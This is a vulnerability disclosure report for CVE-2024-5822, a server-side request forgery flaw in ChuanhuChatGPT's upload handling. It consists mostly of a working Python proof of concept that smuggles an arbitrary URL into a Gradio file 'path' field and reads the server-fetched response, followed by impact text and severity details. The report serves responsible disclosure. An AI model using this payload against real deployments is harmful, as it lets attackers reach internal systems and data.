Title: Chuanhu's upload processing interface has ssrf vulnerability in gaizhenbiao/chuanhuchatgpt

Proof of Concept: 
import requests
import json

#Maybe you need to get a valid session_has first
session_hash = '362qi9l3gqh'
ssrf_url = 'https://www.baidu.com'

url = 'http://127.0.0.1:7860/queue/join?'

headers = {
    'sec-ch-ua': '"Chromium";v="123", "Not:A-Brand";v="8"',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'http://127.0.0.1:7860',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'http://127.0.0.1:7860/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': '_ga=GA1.1.794330819.1713639945; _gid=GA1.1.1338534025.1713639945; _ga_R1FN4KJKJH=GS1.1.1713685405.3.1.1713687223.0.0.0',
    'Connection': 'close'
}

data = {
    "data": [None, [{"meta": {"_type": "gradio.FileData"}, "path": ssrf_url, "url": "", "orig_name": "trace.txt", "size": 4890, "mime_type": "text/plain"}], [], "简体中文"],
    "event_data": None,
    "fn_index": 12,
    "trigger_id": 108,
    "session_hash": session_hash
}

response = requests.post(url, headers=headers, json=data)

print(response.text)


url = 'http://127.0.0.1:7860/queue/data'

params = {
    'session_hash': session_hash
}

response = requests.get(url, headers=headers, params=params)

print(response.text)

lines = response.text.split('\n')
lines.reverse()
url = None
for line in lines:
    if line.startswith('data:'):
        json_data = line[len('data: '):]
        data = json.loads(json_data)
        if data.get('msg') == 'process_completed':
            url = data['output']['data'][0]['value'][0]['url']
            break

response = requests.get(url)

print(response.text)

Impact: 
The impact of an SSRF (Server-Side Request Forgery) vulnerability can be significant. It allows attackers to send crafted requests from the vulnerable server to internal or external resources, bypassing security controls and accessing sensitive data. This could lead to unauthorized access to internal systems, data theft, service disruption, or even complete compromise of the affected server. Additionally, SSRF can be leveraged for further attacks such as port scanning, accessing metadata endpoints, and executing arbitrary code on backend systems, depending on the capabilities of the vulnerable server and the attacker's intent.

CVE ID: CVE-2024-5822
Status: (published)
Vulnerability Type: CWE-918: Server-Side Request Forgery (SSRF)
Severity: High (7.3)
Attack Vector: Network
Attack Complexity: Low
Privileges Required: None
User Interaction: None
Scope: Unchanged
Confidentiality: Low
Integrity: Low
Availability: Low
Registry: Pypi
Affected Version: <=ChuanhuChatGPT-20240410-git.zip
Visibility: Public
Status: Awaiting fix
Disclosure Bounty: $450
Fix Bounty: $112.5
